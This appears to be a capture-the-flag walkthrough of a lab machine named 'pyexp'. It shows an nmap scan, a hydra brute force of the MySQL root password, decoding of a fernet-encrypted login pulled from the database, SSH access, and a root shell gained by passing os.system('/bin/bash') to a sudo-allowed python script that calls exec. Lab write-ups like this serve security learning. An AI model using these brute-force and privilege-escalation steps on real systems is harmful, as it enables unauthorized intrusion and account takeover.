@@ -1,0 +1,67 @@
+NMAP SCAN
+=====================
+ nmap -p- --min-rate=10000 192.168.69.118
+ PORT     STATE SERVICE
+ 1337/tcp open  waste
+ 3306/tcp open  mysql
+
+MYSQL BRUREFORCE
+=====================
+# hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.69.118 -t 64     
+
+4 active[3306][mysql] host: 192.168.69.118   login: root   password: prettywoman
+
+# mysql -u root -h 192.168.69.118 -p
+Enter password:
+MariaDB [(none)]> show databases;
+data
+mysql
+...
+MariaDB [(none)]> use data;
+MariaDB [data]> show tables;
+fernet
+MariaDB [data]> select * from fernet;
+
+| cred| keyy|
+| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+
+After further research I learnt that fernet was a hint and googled fernet decode.
+I landed on https://asecuritysite.com/encryption/ferdecode.
+I enter the token and the key and the decoded creds are 
+Decoded:	lucy:wJ9`"Lemdv9[FEw-
+
+SSH - USER FLAG
+=====================
+ ssh -p 1337 lucy@192.168.69.118
+ lucy@pyexp:~$ id
+uid=1000(lucy) gid=1000(lucy) groups=1000(lucy),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+User flag obtained!
+
+PRIVELEGE ESCALATION - ROOT FLAG
+=====================
+lucy@pyexp:~$ sudo -l
+Matching Defaults entries for lucy on pyexp:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lucy may run the following commands on pyexp:
+    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
+lucy@pyexp:~$ cat /opt/exp.py
+uinput = raw_input('how are you?')
+exec(uinput)
+
+lucy@pyexp:~$ cd /opt
+lucy@pyexp:/opt$ ls
+exp.py
+lucy@pyexp:/opt$ python2 /opt/exp.py
+how are you?import os;os.system("/bin/bash")
+lucy@pyexp:/opt$ sudo python2 /opt/exp.py
+how are you?import os;os.system("/bin/bash")
+root@pyexp:/opt# id
+uid=0(root) gid=0(root) groups=0(root)
+
+This is interesting, use of python for privilege escalation
+
+The box is rooted and that's it!
+
